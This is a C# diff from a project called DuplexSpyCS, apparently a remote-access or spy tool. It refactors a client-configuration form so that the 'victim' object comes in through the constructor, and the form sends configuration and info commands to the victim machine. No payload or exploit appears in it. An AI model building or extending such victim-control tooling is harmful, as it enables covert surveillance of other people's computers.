@@ -13,12 +13,16 @@ namespace DuplexSpyCS
 {
     public partial class frmClientConfig : Form
     {
-        public clsVictim v;
-        public List<string> lsProcName = new List<string>();
+        public clsVictim m_victim { get; init; }
 
-        public frmClientConfig()
+
+        private List<string> lsProcName = new List<string>();
+
+        public frmClientConfig(clsVictim victim)
         {
             InitializeComponent();
+
+            m_victim = victim;
         }
 
         public void ShowConfig(ClientConfig config)
@@ -50,7 +54,7 @@ namespace DuplexSpyCS
             };
 
             string szPayload = string.Join(";", dic.Select(x => $"{x.Key}:{dic[x.Key]}").ToArray());
-            v.SendCommand($"detail|client|set|{szPayload}");
+            m_victim.SendCommand($"detail|client|set|{szPayload}");
         }
 
         void setup()
@@ -58,7 +62,7 @@ namespace DuplexSpyCS
             //Controls
             radioButton2.Checked = true;
 
-            v.SendCommand($"detail|client|info");
+            m_victim.SendCommand($"detail|client|info");
             toolStripStatusLabel1.Text = "Loading...";
         }
 
